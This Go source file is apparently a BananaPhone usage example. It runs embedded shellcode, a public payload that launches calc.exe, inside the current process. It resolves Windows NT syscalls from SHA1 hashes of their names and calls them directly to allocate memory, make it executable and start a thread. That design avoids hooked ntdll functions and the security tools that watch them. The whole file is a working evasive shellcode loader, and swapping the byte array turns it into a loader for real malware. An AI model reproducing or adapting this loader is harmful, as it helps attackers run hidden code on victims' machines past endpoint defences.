package main

import (
	"crypto/sha1"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	bananaphone"github.com/timwhitez/BananaPhone/pkg/BananaPhone"
)

var shellcode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}

//example of using bananaphone to execute shellcode in the current thread.
func main() {
	fmt.Println("Mess with the banana, die like the... banana?") //I found it easier to breakpoint the consolewrite function to mess with the in-memory ntdll to verify the auto-switch to disk works sanely than to try and live-patch it programatically.
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls

	a, e := bp.GetSysIDfromhash("0e8af4e8ad4cca0cccd9a9cbfa30b1148f9d63ee",str2sha1)
	if e != nil {
		panic(e)
	}

	p, e := bp.GetSysIDfromhash("646bd5afa7b482fdd90fb8f2eefe1301a867d7b9",str2sha1)
	if e != nil {
		panic(e)
	}

	c, e := bp.GetSysIDfromhash("b392e445cb36453331f1570154e520ec845fca9c",str2sha1)
	if e != nil {
		panic(e)
	}
	ct(shellcode, uintptr(0xffffffffffffffff), a, p, c)
}

func ct(shellcode []byte, handle uintptr, a, p, c uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bananaphone.Syscall(
		a, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r1, r = bananaphone.Syscall(
		p, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hh uintptr
	r1, r = bananaphone.Syscall(
		c,
		uintptr(unsafe.Pointer(&hh)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hh), 0xffffffff)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func str2sha1(s string) string{
	s = strings.ToLower(s)
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
